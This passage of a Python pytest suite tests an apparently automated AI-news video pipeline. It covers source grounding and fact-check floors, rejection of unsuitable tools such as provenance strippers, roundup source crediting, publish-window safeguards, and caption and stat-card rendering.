    monkeypatch.setattr(ap, "fetch_text", fake_fetch)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: None)
    assert ap.script_tool({"title": "T", "source": "hf",
                           "url": "https://huggingface.co/org/model"}) is None
    assert calls == ["https://huggingface.co/org/model/raw/main/README.md"]


def test_chrome_only_page_is_too_thin_to_ground_a_tool_video(monkeypatch):
    """Product Hunt's server HTML is ~640 chars of nav chrome. It cleared the old
    400-char floor and gates.fact_check's 200-char one, so claims were verified
    against 'Overview Reviews Team More' and came back unsupported."""
    chrome = ("Notion AI | Product Hunt Overview Reviews 1 Team More "
              "Visit website Be the first to leave a review ") * 6
    assert 400 < len(chrome) < ap.TOOL_GROUNDING_MIN
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: chrome)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: None)
    assert ap.script_tool({"title": "T", "source": "ph",
                           "url": "https://www.producthunt.com/posts/x"}) is None


def test_validate_script_coerces_a_non_list_tags(monkeypatch):
    """The model answers `tags` as a comma string / null / an object often enough
    that trusting the type raised out of a bare _validate_script call and killed
    the whole unattended run."""
    for bad, want in (("ai, machine learning", "machine learning"),
                      (None, None), ({"a": 1}, None), (42, None)):
        base = {"title": "T", "description": "d", "tags": bad,
                "scenes": [{"narration": f"s {i}", "visual_query": "v"} for i in range(6)]}
        out = ap._validate_script(base, "t")
        assert isinstance(out["tags"], list) and out["tags"], "brand tags must still land"
        assert all(isinstance(t, str) for t in out["tags"])
        if want:
            assert want in out["tags"]


def test_mangled_block_split_across_a_blank_line_is_fully_excised(monkeypatch):
    """A rewrite that puts a blank line inside the block strands the 📄 line as its
    own paragraph; cutting back to the first blank line only shipped it twice."""
    monkeypatch.setattr(ap.fv, "setting", _settings())
    s = _tool_script(10)
    ap.place_description_blocks(s)
    good = s["description"]
    # the LLM hands back the block reformatted with a blank line before the PDF line
    s["description"] = good.replace("\n" + ap._PDF_MARK, "\n\n" + ap._PDF_MARK)
    s["description"] = s["description"].replace("tools/", "tools/STALE-")
    ap.place_description_blocks(s)
    assert s["description"].count(ap._PDF_MARK) == 1
    assert "STALE-" not in s["description"]
    assert s["description"].count(ap._DL_MARK) == 1


def test_github_tool_grounds_on_the_raw_readme_but_screens_the_page_too(monkeypatch):
    """v3-C.4 #4 supersedes the C.1 behaviour asserted here (page only). Grounding and
    screening are separate: the writer and gates.fact_check get the clean README, while
    gates.tool_unsuitable also sees the page, whose topic tags are the only place a repo
    like facefusion declares itself."""
    calls, prompts = [], []

    def fake(u, limit=4000):
        calls.append(u)
        return ("REAL README PROSE. " * 300 if "raw.githubusercontent.com" in u
                else "You signed in with another tab or window. CHROME. " * 60)

    monkeypatch.setattr(ap, "fetch_text", fake)
    monkeypatch.setattr(ap.llm, "generate_json", lambda p, **k: prompts.append(p) or None)
    ap.script_tool({"title": "T", "source": "gh", "url": "https://github.com/org/repo"})
    assert calls == ["https://raw.githubusercontent.com/org/repo/HEAD/README.md",
                     "https://github.com/org/repo"]
    assert "REAL README PROSE" in prompts[0]
    assert "You signed in with another tab" not in prompts[0],         "GitHub chrome must never reach the writer or the fact-checker again"

    # a source that is neither GitHub nor the hub is still read from its page only
    calls.clear()
    ap.script_tool({"title": "T", "source": "ph", "url": "https://www.producthunt.com/posts/x"})
    assert calls == ["https://www.producthunt.com/posts/x"]


def test_tool_fallback_returns_an_evergreen_labelled_script(monkeypatch):
    """run() re-binds fmt from the returned script so the ledger stops stamping a
    fallback video as format=tool. That is only sound because the fallback really
    does label itself, and because "format" is carried across the rewrite passes."""
    monkeypatch.setattr(ap, "pick_evergreen_topic", lambda ranked: {"title_idea": "how x works"})
    monkeypatch.setattr(ap, "script_evergreen",
                        lambda topic: {"format": "evergreen", "title": "E", "scenes": []})
    out = ap.build_script("tool", [{"title": "n", "kind": "news"}])
    assert out["format"] == "evergreen"
    assert "format" in ap._CARRY


def test_shorts_meta_normalised_so_the_tripwire_cannot_fire_after_upload():
    """A short/ragged shorts_meta used to raise PipelineViolation inside the publish
    block — after the long-form was live and before any PUBLISHED row existed, so
    the retry cron published a second video for the same day."""
    from factverse import scheduling as sch
    script = {"title": "A Very Long Tool Title That Goes On", "description": "d" * 900}
    for bad in (None, [], [{"title": "one #Shorts"}], ["a string", "another"],
                [{"title": "  "}, {"title": "real #Shorts"}], [{}] * 5):
        out = ap.normalize_shorts_meta(bad, 2, script)
        assert len(out) == 2
        assert all(isinstance(m, dict) for m in out)
        titles = [m["title"] for m in out]
        assert all(t and t.strip() for t in titles), f"empty title from {bad!r}"
        # this is exactly what validate_shorts_batch counts
        sch.validate_shorts_batch([object(), object()], titles)
    # a good payload is left alone
    good = [{"title": "t1 #Shorts", "description": "d1"}, {"title": "t2 #Shorts", "description": "d2"}]
    assert ap.normalize_shorts_meta(good, 2, script) == good


def test_unsuitable_tools_are_skipped_before_a_tutorial_is_written(monkeypatch):
    """A tool video TEACHES the tool, so this rejects where sensitive_topic_risk
    only penalises. On 2026-08-23 the live #1 tool candidate was a multi-vendor
    AI-provenance stripper and two 'Uncensored' model forks sat in the queue."""
    from factverse import gates
    assert gates.tool_unsuitable("guillaumemeyer/watermarks-remover: Strip AI provenance")[0]
    assert gates.tool_unsuitable("orcarouter/Qwen3.8-27B-Uncensored-MLX")[0]
    assert not gates.tool_unsuitable("unsloth/Qwen3.8-27B-GGUF — trending model")[0]
    assert not gates.tool_unsuitable("MarkItDown converts Office files to Markdown")[0]

    tried = []
    monkeypatch.setattr(ap, "script_tool", lambda c: tried.append(c["title"]) or None)
    monkeypatch.setattr(ap, "mark_failed", lambda t: None)
    monkeypatch.setattr(ap, "pick_evergreen_topic", lambda r: None)
    monkeypatch.setattr(ap, "script_news", lambda *a, **k: None)
    ap.build_script("tool", [{"title": "watermarks-remover: strip provenance", "kind": "tool"},
                             {"title": "MarkItDown converts files", "kind": "tool"}])
    assert tried == ["MarkItDown converts files"], "the stripper must never reach script_tool"


def test_script_tool_rejects_when_only_the_readme_reveals_it(monkeypatch):
    """A repo can be titled innocuously; intent shows in the README."""
    monkeypatch.setattr(ap, "fetch_text",
                        lambda u, limit=4000: "This tool will strip provenance marks. " * 60)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {"scenes": []})
    assert ap.script_tool({"title": "helpful-utility", "source": "gh",
                           "url": "https://github.com/x/y"}) is None


def test_hf_readme_url_models_only():
    assert (ap._hf_readme_url("https://huggingface.co/org/model")
            == "https://huggingface.co/org/model/raw/main/README.md")
    assert (ap._hf_readme_url("https://huggingface.co/gpt2")
            == "https://huggingface.co/gpt2/raw/main/README.md")
    assert ap._hf_readme_url("https://github.com/org/repo") == ""


def test_validate_script_keeps_filter_marker():
    base = {"scenes": [{"narration": f"s {i}", "visual_query": "v"} for i in range(6)]}
    base["scenes"][3]["filter"] = True                   # the honest-limitation scene
    assert ap._validate_script(base, "t")["filter_segment"] is True
    plain = {"scenes": [{"narration": f"s {i}"} for i in range(6)]}
    assert ap._validate_script(plain, "t")["filter_segment"] is False


# --------------------------------------------------------------- tool lane, composed
def test_tool_lane_advertises_the_pdf_it_actually_writes(monkeypatch, tmp_path):
    """The exact chain run() walks: validate -> place blocks -> advice-gate rewrite ->
    carry -> place again -> write the PDF. Every link is covered above; this asserts
    they COMPOSE, because a drift between the linked name and the written file is a
    permanent 404 on a video that is already published."""
    monkeypatch.setattr(ap.fv, "setting", _settings())
    monkeypatch.setattr(dlv, "TOOLS_DIR", tmp_path)
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: None)   # fallback sheet

    s = ap._validate_script(_tool_script(20), "fallback", "https://github.com/x/y")
    ap.place_description_blocks(s)
    name = s["cheat_sheet"]

    # the advice gate re-generates the script; the LLM echoes back neither v3 key
    rewritten = ap._validate_script(
        {"title": "T2", "description": "brand new hook.\n\nbody", "scenes": s["scenes"]},
        s["title"], s["source_url"])
    assert rewritten["deliverable"] is None                  # the documented reset
    rewritten = ap._carry_over(s, rewritten)
    ap.place_description_blocks(rewritten)

    # a re-slug here would point the description at a file nobody writes
    assert rewritten["cheat_sheet"] == name
    assert rewritten["description"].count(ap._PDF_MARK) == 1
    page = site.page_name(name)
    assert site.public_url(page) in rewritten["description"]     # v3-F.1 #5: the PAGE
    assert page == name[:-4] + ".html"                           # one slug, two files

    written = dlv.make_cheat_sheet(rewritten, video_url="https://youtu.be/ID")
    assert written and Path(written).name == name
    assert dlv.public_url(name).endswith(Path(written).name)

    # ...and the page the description links is the file site.publish_page writes
    monkeypatch.setattr(site, "CATALOG", tmp_path / "tools_index.json")
    monkeypatch.setattr(site, "DOCS", tmp_path / "docs")
    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "docs" / "tools")
    url = site.publish_page(rewritten, dlv.fallback_sheet(rewritten), "https://youtu.be/ID")
    assert url == site.public_url(page)
    assert (tmp_path / "docs" / "tools" / page).exists()


# =============================================================== v3-C.2
# The news / evergreen / roundup lanes. C.1 audited the tool lane only; its
# shared fixes (_validate_script, the publish window) already protected these
# three, but the lanes themselves had never been searched for their own defects.

def _capture(store, result=None):
    """Stub for llm.generate_json that records the prompt it was handed."""
    def _f(prompt, **kw):
        store.append(prompt)
        return result
    return _f


def _mixed_ranked():
    """The live top-6 of 2026-08-23, kinds and order preserved. rank() returns ONE
    list and v3-A added the GitHub/HF/Product Hunt trending feeds to it."""
    return [
        {"title": "guillaumemeyer/watermarks-remover: Strip multi-vendor AI provenance marks",
         "url": "https://github.com/guillaumemeyer/watermarks-remover", "source": "github",
         "kind": "tool", "fit_score": 70.5},
        {"title": "Qwen/Qwen3.8-27B - trending image text to text on Hugging Face",
         "url": "https://huggingface.co/Qwen/Qwen3.8-27B", "source": "hf",
         "kind": "tool", "fit_score": 70.5},
        {"title": "Inherent, founded by DeepMind alumni, says its AI teammate outperformed humans",
         "url": "https://tc.test/inherent", "source": "techcrunch", "kind": "news", "fit_score": 68.1},
        {"title": "unsloth/Qwen3.8-27B-GGUF - trending model on Hugging Face",
         "url": "https://huggingface.co/unsloth/Qwen3.8-27B-GGUF", "source": "hf",
         "kind": "tool", "fit_score": 58.9},
        {"title": "OpenAI says California should strengthen its AI safety bill",
         "url": "https://vg.test/openai-ca", "source": "verge", "kind": "news", "fit_score": 55.2},
        {"title": "Frontier AI labs still won't say how they'd contain a rogue model",
         "url": "https://ax.test/rogue", "source": "axios", "kind": "news", "fit_score": 55.1},
    ]


# --------------------------------------------------------------- candidate leakage
def test_news_lane_never_writes_about_a_tool_candidate(monkeypatch):
    """gates.tool_unsuitable guards the tool lane and nothing else, so the same
    provenance stripper it refuses to TEACH could still be written up as the day's
    news story — it was ranked #1 on 2026-08-23 and #2 was a model card."""
    tried = []
    monkeypatch.setattr(ap, "script_news", lambda c, **k: tried.append(c["title"]) or None)
    monkeypatch.setattr(ap, "mark_failed", lambda t: None)
    monkeypatch.setattr(ap.gates, "pick_hook_pattern", lambda r: "number")
    monkeypatch.setattr(ap, "_recent_hook_patterns", lambda n=6: [])
    ap.build_script("news", _mixed_ranked())
    assert tried, "the news lane must still have candidates to try"
    assert not any(("watermarks-remover" in t) or ("Qwen" in t) for t in tried), \
        f"a tool signal reached script_news: {tried}"


def test_viral_judge_scores_stories_not_repos(monkeypatch):
    """viral_pick decides the DAY's format. Scoring 'Strip multi-vendor AI provenance
    marks' for shock value is how a repo becomes the news story."""
    prompts = []
    monkeypatch.setattr(ap.llm, "generate_json", _capture(prompts))
    ap.viral_pick(_mixed_ranked())
    listing = prompts[0]
    assert "Inherent" in listing, "real stories must still be judged"
    assert "watermarks-remover" not in listing and "Qwen" not in listing


def test_roundup_counts_stories_not_model_cards(monkeypatch):
    """'The 5 AI stories that actually mattered this week' drew from the same mixed
    list — 4 of the live top 5 were HF/GitHub repos."""
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "real article text " * 60)
    prompts = []
    monkeypatch.setattr(ap.llm, "generate_json", _capture(prompts))
    ap.script_roundup(_mixed_ranked())
    block = prompts[0]
    assert "Inherent" in block and "California" in block
    assert "watermarks-remover" not in block and "GGUF" not in block


def test_roundup_keeps_the_sunday_when_stories_are_scarce(monkeypatch):
    """Filtering must not cost the week: with fewer than 3 story signals the
    roundup tops up from what is left rather than returning nothing."""
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "text " * 300)
    prompts = []
    monkeypatch.setattr(ap.llm, "generate_json", _capture(prompts))
    thin = [_mixed_ranked()[2]] + [c for c in _mixed_ranked() if c["kind"] == "tool"]
    ap.script_roundup(thin)
    assert "STORY 3:" in prompts[0], "a one-story week must still fill the countdown"


# --------------------------------------------------------------- roundup grounding
def test_roundup_gates_read_the_text_the_prompt_read(monkeypatch):
    """The grounding was fetched TWICE — once for the prompt, once for the gates.
    A transient failure on the second pass empties script['grounding'], and an
    empty grounding makes verbatim_overlap 0.0 and fact_check skip: the copy gate
    then passes trivially on a script written from real source text."""
    seen_urls = set()

    def flaky(url, limit=4000):
        # the second fetch of the same page is the one that comes back empty
        if url in seen_urls:
            return ""
        seen_urls.add(url)
        return "genuine article sentence about the model launch. " * 40

    monkeypatch.setattr(ap, "fetch_text", flaky)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {
        "title": "This Week in AI",
        "scenes": [{"narration": f"scene {i} narration text", "visual_query": "v"}
                   for i in range(6)]})
    s = ap.script_roundup([c for c in _mixed_ranked() if c["kind"] == "news"])
    assert s and "genuine article sentence" in s["grounding"],         "the gates must see the same text the prompt was written from"
    assert ap.verbatim_overlap("genuine article sentence about the model launch . " * 3,
                               s["grounding"]) > 0.5, "the copy gate must still have teeth"


def test_roundup_grounding_covers_every_story(monkeypatch):
    """Only picked[:3] was re-fetched for the gates, so stories 4 and 5 were never
    fact-checked or copy-checked — and the tail is where lifted prose hides."""
    marks = {}

    def per_story(url, limit=4000):
        marks[url] = f"UNIQUEMARK{len(marks)} " + "body text " * 40
        return marks[url]

    items = [{"title": f"Story {i}", "url": f"https://s{i}.test/a", "source": f"src{i}",
              "kind": "news"} for i in range(5)]
    monkeypatch.setattr(ap, "fetch_text", per_story)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {
        "title": "This Week in AI",
        "scenes": [{"narration": f"scene {i} text", "visual_query": "v"} for i in range(6)]})
    s = ap.script_roundup(items)
    for i in range(5):
        assert f"UNIQUEMARK{i}" in s["grounding"], f"story {i + 1} is ungated"


def test_roundup_description_lists_every_source(monkeypatch):
    """The video burns 'Sources in description' on screen. _validate_script adds
    exactly one Source line — story 1's — so four outlets went uncredited."""
    monkeypatch.setattr(ap.fv, "setting", lambda k, d=None: "" if k == "promo_block" else d)
    script = {"format": "roundup", "description": "Hook line.\n\nBody paragraph.",
              "roundup_items": [{"title": f"Story {i}", "url": f"https://s{i}.test/a"}
                                for i in range(5)]}
    ap.place_description_blocks(script)
    for i in range(5):
        assert f"https://s{i}.test/a" in script["description"]
    before = script["description"]
    ap.place_description_blocks(script)
    assert script["description"] == before, "must be idempotent — run() calls it twice"


def test_roundup_does_not_brand_five_outlets_with_one():
    """src_domain came from source_url, which _validate_script sets to picked[0]'s
    URL — so the on-screen chip and every stat card stamped story 1's outlet across
    the whole video, and the 'Sources in description' branch was unreachable."""
    roundup = {"format": "roundup", "source_url": "https://techcrunch.test/story-one"}
    assert ap.source_chip(roundup) == ("", "Sources in description")
    news = {"format": "news", "source_url": "https://www.theverge.com/2026/x"}
    assert ap.source_chip(news) == ("theverge.com", "Source: theverge.com")
    assert ap.source_chip({"format": "evergreen", "source_url": ""}) == ("", "")


# --------------------------------------------------------------- advice gate window
def test_advice_gate_reads_the_whole_narration(monkeypatch):
    """The LLM confirmation was armed from script_text[:2000]. A 900-word script is
    ~5,500 chars, so anything prescriptive in the last two thirds was never checked."""
    from factverse import gates
    asked = []
    monkeypatch.setattr(gates.llm, "generate_json",
                        _capture(asked, {"advice": True, "evidence": "late"}))
    late = ("A neutral sentence about model design. " * 90
            + "Put your savings into that stock before the earnings call.")
    assert len(late) > 3000
    out = gates.advice_framing(late)
    assert asked, "a sensitive term past char 2000 must still arm the LLM check"
    assert out["advice"] is True


# --------------------------------------------------------------- evergreen dedup
def test_evergreen_topic_rejects_a_reworded_repeat(monkeypatch):
    """Exact lowercase equality was the only dedup, while the signal engine already
    carries _too_similar for precisely this — a re-worded topic is the same video."""
    monkeypatch.setattr(ap, "_read_json",
                        lambda p, d: ["How Do Large Language Models Actually Work"]
                        if p == ap.USED_TOPICS else d)
    monkeypatch.setattr(ap, "too_many_failures", lambda t: False)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {"topics": [
        {"title_idea": "How Large Language Models Actually Work", "search_question": "q"},
        {"title_idea": "Why AI Chips Cost So Much", "search_question": "q"}]})
    t = ap.pick_evergreen_topic([])
    assert t["title_idea"] == "Why AI Chips Cost So Much"


# --------------------------------------------------------------- veto window truth
def test_notify_review_does_not_claim_a_window_it_never_opened(monkeypatch):
    """requests.post does not raise on 401/404. The log said 'veto window active'
    while no issue existed and the video published unattended anyway."""
    monkeypatch.setenv("GITHUB_TOKEN", "t")
    monkeypatch.setenv("GITHUB_REPOSITORY", "o/r")

    class _R:
        status_code = 404
        text = "Not Found"

    monkeypatch.setattr(ap.requests, "post", lambda *a, **k: _R())
    out = []
    monkeypatch.setattr("builtins.print", lambda *a, **k: out.append(" ".join(str(x) for x in a)))
    ap._notify_review({"title": "T"}, None, "https://y.test/v", "2026-08-23T16:45:00Z",
                      {"score": 0.7, "components": {}})
    joined = "\n".join(out)
    assert "veto window active" not in joined
    assert "404" in joined and "REVIEW WINDOW" in joined, "it must fall back to the log"


# --------------------------------------------------------------- ledger cannot raise
def test_record_run_survives_a_value_json_cannot_serialize(tmp_path, monkeypatch):
    """record_run caught OSError only. It is the LAST statement of the publish
    window C.1 closed: if it raises, the video is live with no PUBLISHED row and
    the 14:53 retry cron publishes a second one into the same slot."""
    log = tmp_path / "runs.jsonl"
    monkeypatch.setattr(ap, "RUNS_LOG", log)
    ap.record_run(status="PUBLISHED", format="news", title="T",
                  publish_at=Path("x"), odd={1, 2})
    row = json.loads(log.read_text(encoding="utf-8").splitlines()[-1])
    assert row["status"] == "PUBLISHED" and row["title"] == "T"


# --------------------------------------------------------------- thin grounding
def test_news_refuses_a_story_it_cannot_fact_check(monkeypatch):
    """With empty grounding every accuracy gate passes for free: verbatim_overlap
    scores 0.0, fact_check skips below 200 chars, verify_synthesis has nothing to
    compare, and the confidence 'facts' component reads 1.0 — identical to a fully
    verified script. If the fact-checker cannot run, the lane must not write."""
    called = []
    monkeypatch.setattr(ap.llm, "generate_json", _capture(called, {"scenes": []}))
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "")
    assert ap.script_news({"title": "T", "source": "s", "url": "https://x.test/a"}) is None
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "x" * 199)
    assert ap.script_news({"title": "T", "source": "s", "url": "https://x.test/a"}) is None
    assert not called, "no LLM call is worth making against an unsourced headline"
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "real reporting. " * 40)
    ap.script_news({"title": "T", "source": "s", "url": "https://x.test/a"})
    assert called, "a properly grounded story must still be written"


def test_evergreen_stays_ungrounded_by_design(monkeypatch):
    """The floor applies to the lanes that CLAIM a source. An evergreen explainer
    has no source URL and gates.fact_check's skip note names it explicitly."""
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {
        "title": "E", "scenes": [{"narration": f"s {i}", "visual_query": "v"} for i in range(6)]})
    s = ap.script_evergreen({"title_idea": "How AI chips work"})
    assert s and s["format"] == "evergreen" and s["grounding"] == ""


def test_roundup_refuses_an_unsourced_countdown(monkeypatch):
    """Five stories that all failed to fetch produce five '(none)' excerpts — a
    countdown written entirely from headlines, gated by nothing."""
    called = []
    monkeypatch.setattr(ap.llm, "generate_json", _capture(called, None))
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "")
    assert ap.script_roundup([c for c in _mixed_ranked() if c["kind"] == "news"]) is None
    assert not called


def test_roundup_failure_does_not_cost_the_sunday(monkeypatch):
    """Sunday is the only roundup slot; a dead fetch must not mean no video.
    Same fallback shape the tool lane already uses, and the script labels itself
    so run() re-binds fmt and the ledger stays honest."""
    monkeypatch.setattr(ap, "script_roundup", lambda items: None)
    monkeypatch.setattr(ap, "pick_evergreen_topic", lambda r: {"title_idea": "how x works"})
    monkeypatch.setattr(ap, "script_evergreen",
                        lambda t: {"format": "evergreen", "title": "E", "scenes": []})
    out = ap.build_script("roundup", _mixed_ranked())
    assert out and out["format"] == "evergreen"


def test_evergreen_dedup_separates_a_reword_from_a_new_subject(monkeypatch):
    """0.5 (the signal engine's headline default) blocks the lane's own title
    template — the evergreen prompt literally asks for 'how does X actually work'.
    0.7 still catches the re-word."""
    from factverse.intelligence import signal_engine as se
    used = {se._norm("How Diffusion Models Actually Work")}
    assert se._is_used("How Transformers Actually Work", used)                    # 0.5: blocked
    assert not se._is_used("How Transformers Actually Work", used,
                           threshold=ap.EVERGREEN_DUP_OVERLAP)
    reword = {se._norm("How Do Large Language Models Actually Work")}
    assert se._is_used("How Large Language Models Actually Work", reword,
                       threshold=ap.EVERGREEN_DUP_OVERLAP)

    monkeypatch.setattr(ap, "_read_json",
                        lambda p, d: ["How Diffusion Models Actually Work"]
                        if p == ap.USED_TOPICS else d)
    monkeypatch.setattr(ap, "too_many_failures", lambda t: False)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {"topics": [
        {"title_idea": "How Transformers Actually Work", "search_question": "q"}]})
    assert ap.pick_evergreen_topic([])["title_idea"] == "How Transformers Actually Work"


def test_roundup_does_not_stack_one_outlet(monkeypatch):
    """Curation is the roundup's whole added value — and its policy defence. The
    dedup only skipped a repeat once THREE distinct sources were already banked,
    so on a feed where one outlet dominates it never fired: the live signals of
    2026-08-23 produced a five-story countdown of five TechCrunch stories."""
    items = ([{"title": f"TC story {i}", "url": f"https://tc.test/{i}",
               "source": "news/techcrunch", "kind": "news"} for i in range(5)]
             + [{"title": "HF post", "url": "https://hf.test/1",
                 "source": "blog/huggingface", "kind": "news"},
                {"title": "OpenAI post", "url": "https://oa.test/1",
                 "source": "blog/openai", "kind": "news"}])
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "body text " * 60)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {
        "title": "This Week in AI",
        "scenes": [{"narration": f"scene {i} text", "visual_query": "v"} for i in range(6)]})
    s = ap.script_roundup(items)
    hosts = {it["url"].split("/")[2] for it in s["roundup_items"]}
    assert len(s["roundup_items"]) == 5, "the countdown must still be full"
    assert hosts == {"tc.test", "hf.test", "oa.test"}, f"one outlet dominated: {hosts}"


# --------------------------------------------------------------- v3-C.3 render surfaces
def test_count_seq_final_frame_is_the_stat_verbatim():
    """The count-up formatter is not an identity function at its own end point.
    The frame held longest on screen was re-rendering the number through a
    format spec: "120.5 billion" became "120 billion" and "154.7%" became
    "155%" — the card contradicting the narration on a fact-checked channel."""
    from factverse import infographics as ig
    for stat in ("54%", "154.7%", "120.5 billion", "1500x", "$2 billion",
                 "12.5%", "99.9%", "2,400 percent", "3.7 million"):
        assert ig._count_seq(stat, 1.0) == stat, f"final frame rewrote {stat!r}"
    # the intermediate frames must still animate
    assert ig._count_seq("54%", 0.0) == "0%"
    assert ig._count_seq("54%", 0.3) != "54%"


def test_card_duration_matches_the_slot_step5_build_will_give_it():
    """step5_build splits a scene's time equally between its clips, so a card
    stacked onto a 2-clip scene gets sdur/3 — not the fixed 4.0s it was rendered
    at. Long slot: -stream_loop replays the count-up mid-scene. Short slot: the
    clip is cut before the count finishes and the last frame shows a number that
    is not the one the script says (measured: 43% for a true 54%)."""
    from factverse import infographics as ig
    # a 20s scene with 2 stock clips: the card's real share is 20/3
    assert ig.card_slot_dur(20.0, 2) == 20.0 / 3
    # a scene with no stock clips still gets the whole scene
    assert ig.card_slot_dur(6.0, 0) == 6.0
    # missing/degenerate duration falls back to the module default, never 0
    assert ig.card_slot_dur(None, 2) == ig.CARD_DUR
    assert ig.card_slot_dur(0.0, 2) == ig.CARD_DUR


def test_inject_cards_renders_each_card_at_its_own_scene_share(monkeypatch):
    """The card must be rendered to the slot, not looped or cut to fit it."""
    from factverse import infographics as ig
    seen = []

    def _fake_card(stat, label, out, source="", dur=4.0, size=(1280, 720)):
        seen.append((stat, round(dur, 3)))
        return out

    monkeypatch.setattr(ig, "plan_cards", lambda s, max_cards=4: [
        {"n": 1, "stat": "54%", "label": "l1"}, {"n": 2, "stat": "9x", "label": "l2"}])
    monkeypatch.setattr(ig, "make_card_clip", _fake_card)
    clips = [["a.mp4", "b.mp4"], ["c.mp4"]]
    ig.inject_cards({}, clips, source_domain="x.test", scene_durs=[30.0, 8.0])
    assert seen == [("54%", 10.0), ("9x", 4.0)], seen
    # and the card really is the scene's lead visual
    assert "statcard" in clips[0][0] or clips[0][0].endswith(".mp4")
    assert len(clips[0]) == 3 and len(clips[1]) == 2


def test_fit_font_shrinks_until_the_text_measures_inside_the_budget():
    """The one shrink loop, shared by every surface that draws text on a frame.
    make_tool_thumb already had it inline; compose, _text_block and the stat card
    picked a size off a character-count ladder and drew it unmeasured."""
    from PIL import Image, ImageDraw
    from factverse import branding as br
    d = ImageDraw.Draw(Image.new("RGB", (1280, 720)))
    lines = ["OPENAI QUIETLY SHIPPED", "A NEW REASONING MODEL"]
    size, font = br.fit_font(br._font, lines, 150, 1280 - 2 * 56)
    assert size <= 150
    assert max(d.textlength(l, font=font) for l in lines) <= 1280 - 2 * 56
    # a floor is honoured when the caller prefers overflow to illegibility
    size2, _ = br.fit_font(br._font, ["A VERY LONG HEADLINE INDEED"], 130, 50, floor=72)
    assert size2 == 72


def test_stat_is_never_cut_mid_word_and_is_drawn_inside_the_card():
    """plan_cards capped the stat at 12 characters, so "120.5 billion" reached
    the screen as "120.5 billio" — and even capped, "2,400 percen" measures
    1304px on a 1280px card and is clipped at both edges."""
    from PIL import Image, ImageDraw
    from factverse import infographics as ig
    from factverse import branding as br
    assert ig._cap_stat("120.5 billion") == "120.5 billion"
    assert ig._cap_stat("2,400 percent") == "2,400 percent"
    assert ig._cap_stat("54%") == "54%"
    # an LLM answering with a sentence is still bounded, but on a word boundary
    long = ig._cap_stat("54 percent of all enterprise deployments surveyed")
    assert not long.endswith(" ") and " " in long and len(long) <= 24
    assert long in "54 percent of all enterprise deployments surveyed"
    d = ImageDraw.Draw(Image.new("RGB", (1280, 720)))
    size, font = br.fit_font(br._font, ["2,400 percent"], int(720 * 0.30), 1280)
    assert d.textlength("2,400 percent", font=font) <= 1280


def test_build_ass_events_never_overlap(tmp_path):
    """The +0.10s hold had no clamp against the next line's start, and phrases
    flush on max_words far more often than on a real pause — so the break lands
    mid-speech where whisper reports word N+1 starting exactly at word N's end.
    Measured over the 24 archived, actually-burned state/assets/*/captions.ass:
    5,626 of 6,515 consecutive boundaries overlapped (86.4%), 5,624 of them by
    exactly 0.10s. libass stacks overlapping events, so two caption phrases were
    on screen together at ~86% of phrase changes in every video shipped."""
    import re as _re
    # four words per line (the default), each abutting the next exactly
    words = [(i * 0.4, (i + 1) * 0.4, f"w{i}") for i in range(12)]
    out = captions.build_ass(words, str(tmp_path / "o.ass"))
    ev = [(m.group(1), m.group(2)) for m in
          _re.finditer(r"Dialogue: \d+,([\d:.]+),([\d:.]+),", Path(out).read_text(encoding="utf-8"))]
    assert len(ev) >= 3
    def _s(t):
        h, m_, s = t.split(":")
        return int(h) * 3600 + int(m_) * 60 + float(s)
    for (a, b) in zip(ev, ev[1:]):
        assert _s(a[1]) <= _s(b[0]), f"{a} overlaps {b}"
    # the hold is still there where there IS room for it
    gapped = captions.build_ass([(0.0, 0.4, "a"), (5.0, 5.4, "b")], str(tmp_path / "g.ass"))
    ev2 = _re.findall(r"Dialogue: \d+,[\d:.]+,([\d:.]+),", Path(gapped).read_text(encoding="utf-8"))
    assert _s(ev2[0]) == 0.5


def test_build_ass_keeps_a_line_visible_even_when_the_next_starts_instantly():
    """The clamp must never invert a line into a zero/negative duration."""
    words = [(0.0, 1.0, "one"), (1.0, 2.0, "two"), (2.0, 3.0, "three"), (3.0, 4.0, "four"),
             (4.0, 4.05, "five")]
    import tempfile, os, re as _re
    p = os.path.join(tempfile.mkdtemp(), "x.ass")
    captions.build_ass(words, p, max_words=4)
    for m in _re.finditer(r"Dialogue: \d+,([\d:.]+),([\d:.]+),", Path(p).read_text(encoding="utf-8")):
        def _s(t):
            h, mm, s = t.split(":")
            return int(h) * 3600 + int(mm) * 60 + float(s)
        assert _s(m.group(2)) > _s(m.group(1))


# --------------------------------------------------------------- shorts
def test_hook_wrap_keeps_every_word_and_fits_the_vertical_frame():
    """The old wrap used a 16-character budget and, on reaching 2 lines, broke
    with the pending word still in `cur` — which was then dropped. The in-spec
    6-word hook below was published as "Anthropic" / "benchmark". It also broke
    the fact-check contract: gates.fact_check verifies the FULL hook_text, so a
    silent cut can strip the qualifier off a checked claim."""
    from PIL import Image, ImageDraw
    from factverse import shorts as sh
    from factverse import branding as br
    d = ImageDraw.Draw(Image.new("RGB", (sh.VW, sh.VH)))
    for hook in ("Anthropic benchmark methodology quietly changed again",
                 "The new model beats every open source rival",
                 "54% already had an incident",
                 "Why the price drop backfires"):
        lines, size = sh._wrap_hook(hook, sh._overlay_font)
        assert 1 <= len(lines) <= 2
        assert " ".join(lines).replace("…", "").strip() == hook, f"dropped words from {hook!r}"
        f = sh._overlay_font(size)
        for ln in lines:
            assert d.textlength(ln, font=f) <= sh.VW - 2 * sh.HOOK_MARGIN, f"{ln!r} overflows"


def test_hook_wrap_ellipsises_rather_than_cutting_silently():
